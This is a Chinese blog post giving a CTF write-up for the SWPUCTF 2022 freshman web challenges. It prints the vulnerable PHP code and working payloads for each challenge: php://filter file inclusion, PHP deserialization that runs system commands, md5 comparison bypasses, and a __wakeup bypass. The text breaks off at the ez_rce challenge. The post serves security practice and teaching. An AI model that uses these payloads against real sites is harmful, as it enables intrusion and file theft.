<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="SWPUCTF_2022新生赛web方向wp">
<meta property="og:type" content="article">
<meta property="og:title" content="SWPUCTF_2022新生赛(web)WP">
<meta property="og:url" content="https://guayu-kakeru.github.io/posts/38113.html">
<meta property="og:site_name" content="guayu-kakeru">
<meta property="og:description" content="SWPUCTF_2022新生赛web方向wp">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b1eae8d0e0a243d4ffdea6.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b1eb60d0e0a243d4ffdeb2.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b1ec81d0e0a243d4ffdedf.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b1f05bd0e0a243d4ffdfa3.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b1f44ad0e0a243d4ffe0a0.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b1f66cd0e0a243d4ffe11e.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b1f9e6d0e0a243d4ffe183.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b1fbc0d0e0a243d4ffe1cd.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b1ff0ad0e0a243d4ffe262.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b1ff7ad0e0a243d4ffe26c.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b204f4d0e0a243d4ffe2e0.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b2dabed0e0a243d40024e3.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b2dad1d0e0a243d40024e8.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b2dc5ad0e0a243d4002585.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b30478d0e0a243d4003c84.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b2f4aed0e0a243d4002fc8.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b2ffc6d0e0a243d400383d.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b3006dd0e0a243d40039c5.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b304e8d0e0a243d4003cb2.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b3066ed0e0a243d4003d4e.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b321dfd0e0a243d400462e.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b32278d0e0a243d400464a.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b322edd0e0a243d4004662.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b3256cd0e0a243d40046d1.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b327afd0e0a243d400473b.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b33e67d0e0a243d4004d96.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b33eb6d0e0a243d4004d9e.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b33f28d0e0a243d4004daa.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b33fb4d0e0a243d4004dcd.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b343ccd0e0a243d4004f14.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b344dbd0e0a243d4004f48.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b345cdd0e0a243d4004fb9.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b3567cd0e0a243d4005280.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67b35a17d0e0a243d4005318.png">
<meta property="article:published_time" content="2025-02-16T13:16:22.000Z">
<meta property="article:modified_time" content="2025-02-18T08:19:22.391Z">
<meta property="article:author" content="guayu-kakeru">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67b1eae8d0e0a243d4ffdea6.png">

<link rel="canonical" href="https://guayu-kakeru.github.io/posts/38113.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>SWPUCTF_2022新生赛(web)WP | guayu-kakeru</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">guayu-kakeru</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">13</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">76</span></a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/38113.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="guayu-kakeru">
      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="guayu-kakeru">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          SWPUCTF_2022新生赛(web)WP
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-02-16 21:16:22" itemprop="dateCreated datePublished" datetime="2025-02-16T21:16:22+08:00">2025-02-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-02-18 16:19:22" itemprop="dateModified" datetime="2025-02-18T16:19:22+08:00">2025-02-18</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
      
      
      
        <p>SWPUCTF_2022新生赛web方向wp</p>
<span id="more"></span>
<p>做题平台:<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem">nssctf</a></p>
<h1 id="ez-ez-php"><a href="#ez-ez-php" class="headerlink" title="ez_ez_php"></a>ez_ez_php</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">3</span>) === <span class="string">&quot;php&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure></div>
<p>只要<code>file</code>参数前三个数是php就包含这个文件，所以用php伪协议读文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:26709/?file=php://filter/read=convert.base64-encode/resource=flag</span><br><span class="line">Nice!!!TlNTQ1RGezRiMTAyN2E1LWYwMmYtNDk1MC05NjhhLTNiZTI4NDFiZGE3MH0K</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> TlNTQ1RGezRiMTAyN2E1LWYwMmYtNDk1MC05NjhhLTNiZTI4NDFiZGE3MH0K | <span class="built_in">base64</span> -d</span><br><span class="line">NSSCTF&#123;4b1027a5-f02f-4950-968a-3be2841bda70&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="ez-ez-php-revenge"><a href="#ez-ez-php-revenge" class="headerlink" title="ez_ez_php (revenge)"></a>ez_ez_php (revenge)</h1><p>题目和上题一模一样<br>但是现在用上题的payload就只有一个nice没有显示flag,但是这里就是路径变了改成根目录下的flag就可以</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:26620/?file=php://filter/read=convert.base64-encode/resource=/flag</span><br><span class="line">Nice!!!TlNTQ1RGezA3NThlMzNjLWI3MmMtNDIyNy04NzA0LTFiOTcxN2Y3NjI0MH0K</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> TlNTQ1RGezA3NThlMzNjLWI3MmMtNDIyNy04NzA0LTFiOTcxN2Y3NjI0MH0K | <span class="built_in">base64</span> -d</span><br><span class="line">NSSCTF&#123;0758e33c-b72c-4227-8704-1b9717f76240&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="1z-unserialize"><a href="#1z-unserialize" class="headerlink" title="1z_unserialize"></a>1z_unserialize</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lyh</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;NSSCTF.com&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lly</span>;</span><br><span class="line">     </span><br><span class="line">     <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;lt;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$a</span>(<span class="variable language_">$this</span>-&gt;lly);</span><br><span class="line">     &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nss&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>
<p>这是一个反序列化题，那就是<code>$lt</code>变量赋值给<code>$a</code>,然后<code>$a</code>可以当作一个函数,内容是<code>lly</code><br>这里还要注意一下这个类有三个变量，虽然用到的只有两个，但是我们自己写的时候也要把三个变量都写出来</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lyh</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lly</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lyh</span>();</span><br><span class="line"><span class="variable">$m</span> -&gt; lt = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$m</span> -&gt; lly = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$m</span>));</span><br><span class="line"></span><br><span class="line">O:<span class="number">3</span>:<span class="string">&quot;lyh&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;url&quot;</span>;N;s:<span class="number">2</span>:<span class="string">&quot;lt&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;lly&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;ls /&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后用POST方式传入nss参数<br><img src="https://pic1.imgdb.cn/item/67b1eae8d0e0a243d4ffdea6.png"><br>找到flag在&#x2F;flag，然后把lly改成”cat &#x2F;flag”再传入就可以</p>
<h1 id="奇妙的-MD5"><a href="#奇妙的-MD5" class="headerlink" title="奇妙的 MD5"></a>奇妙的 MD5</h1><p><img src="https://pic1.imgdb.cn/item/67b1eb60d0e0a243d4ffdeb2.png"><br>我怕，题目是md5，我们就把特殊的md5之后以0e开头的字符串输入试试<br>但是没有用，然后看页面源代码，也没有信息<br>丛标头中找到一个hint<br><img src="https://pic1.imgdb.cn/item/67b1ec81d0e0a243d4ffdedf.png"><br>这个我在做ctfshow中的题目有碰到过<br>md5($str, false) 这是md5的默认情况 返回32位16进制数   如果是 md5($str, true)就返回16位二进制数      ffifdyop 是true参数时候的漏洞  md5 (‘ffifdyop’,true)&#x3D;’or’6xxxxxx<br>所有这里输入<code>ffifdyop</code> 跳转到c0nt1nue.php<br>查看源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl http://node5.anna.nssctf.cn:24841/c0nt1nue.php                                                       </span><br><span class="line">&lt;!--</span><br><span class="line"><span class="variable">$x</span>= <span class="variable">$GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="variable">$y</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span> != <span class="variable">$y</span> &amp;&amp; md5(<span class="variable">$x</span>) == md5(<span class="variable">$y</span>))&#123;</span><br><span class="line">    ;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>
<p>这里就是get传入两个不同字符串 md5相同的字符串，这个熟悉了<br>就传入<code>240610708</code> <code>QNKCDZO</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GML"><figure class="iseeu highlight /gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="variable language_">x</span>=<span class="number">240610708</span>&amp;<span class="variable language_">y</span>=QNKCDZO</span><br></pre></td></tr></table></figure></div>
<p>进入到最后一个页面</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;wqh&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;dsy&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;wqh&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dsy&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里要用数组绕过md5<br>在 PHP 中，如果 md5() 作用于一个数组，它不会计算哈希，而是返回 NULL，但不会报错（因为 error_reporting(0); 关闭了错误输出）。<br><img src="https://pic1.imgdb.cn/item/67b1f05bd0e0a243d4ffdfa3.png"><br>这样子就是两个数组都是NULL了</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>!=</code></td>
<td><strong>不等于</strong>（只比较值，允许类型转换）</td>
</tr>
<tr>
<td><code>!==</code></td>
<td><strong>全不等</strong>（值或类型不同都算不等）</td>
</tr>
</tbody></table>
<h1 id="ez-ez-unserialize"><a href="#ez-ez-unserialize" class="headerlink" title="ez_ez_unserialize"></a>ez_ez_unserialize</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span> = <span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$x</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;x = <span class="variable">$x</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;x !== <span class="keyword">__FILE__</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;x = <span class="keyword">__FILE__</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;x);</span><br><span class="line">        <span class="comment">//flag is in fllllllag.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;x&#x27;</span>])) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里主要考查的是wakeup魔法函数的绕过，我们之前在2021的新生题里面碰到过，就是让序列化的个数和实际不符的时候就回跳过<br>在 PHP 中，$_REQUEST 是一个超全局变量，用于获取通过多种方式（如 GET、POST、COOKIE）发送到脚本的数据。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">X</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; x = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;X&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;x&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>O:&lt;类名长度&gt;:”&lt;类名&gt;”:&lt;成员数量&gt;:{&lt;成员&gt;} 把成员数量改一下，绕过wakeup函数<br><img src="https://pic1.imgdb.cn/item/67b1f44ad0e0a243d4ffe0a0.png"></p>
<h1 id="where-am-i"><a href="#where-am-i" class="headerlink" title="where_am_i"></a>where_am_i</h1><p><img src="https://pic1.imgdb.cn/item/67b1f66cd0e0a243d4ffe11e.png"><br>源代码中有一句提示<code>什么东西是11位啊</code><br>ai了一下什么是11位的，知道手机号是11位的，但是还是不知道咋做<br>看了wp要去搜这个图然后查酒店的电话，有点逆天。。<br><img src="https://pic1.imgdb.cn/item/67b1f9e6d0e0a243d4ffe183.png"><br>成都的古迹酒店，填入电话</p>
<h1 id="ez-rce"><a href="#ez-rce" class="headerlink" title="ez_rce"></a>ez_rce</h1><p>题目</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">真的什么都没有吗？</span><br></pre></td></tr></table></figure>
<p>发现有robots.txt文件</p>
